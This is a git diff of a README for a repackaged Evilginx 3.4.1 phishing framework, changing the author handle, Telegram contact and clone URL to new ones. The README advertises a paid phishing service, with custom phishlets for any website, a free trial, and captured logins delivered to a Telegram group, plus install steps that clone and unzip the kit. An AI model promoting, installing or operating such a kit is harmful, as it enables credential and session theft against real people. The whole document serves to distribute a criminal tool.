@@ -5,9 +5,8 @@
   </p>
 </p>
 
-# Latest Evilginx 3.4.1 - Modified by @HosterMSG
+# Latest Evilginx 3.4.1 - Modified by @therealelyayo
 
-![alt text](https://github.com/EvilHoster/EvilGinx2-3.4.1-Modification/blob/main/screenshot.jpg?raw=true)
 
 
 #ABOUT NEW UPDATES PLEASE READ CHANGELOGS FILE !
@@ -18,7 +17,7 @@
 #Incase u want more phishlets not only Ionos, let me know we can do any website u want without any upfront payments.
 #We provide 4 hour free testing around before any kind a payment.
 #In testing time u will have full access to telegram group where logs will be delivered.
-https://t.me/HosterMSG
+https://t.me/thefrayedone
 
 
 
@@ -30,7 +29,7 @@ How to install ?
 
 On Ubuntu:
 
-1. git clone https://github.com/EvilHoster/EvilGinx2-3.4.1-Modification
+1. git clone https://github.com/therealelyayo/flashfire-cookies
 2. cd EvilGinx2-3.4.1-Modification
 3. unzip latest.zip
 4. cd evilhoster
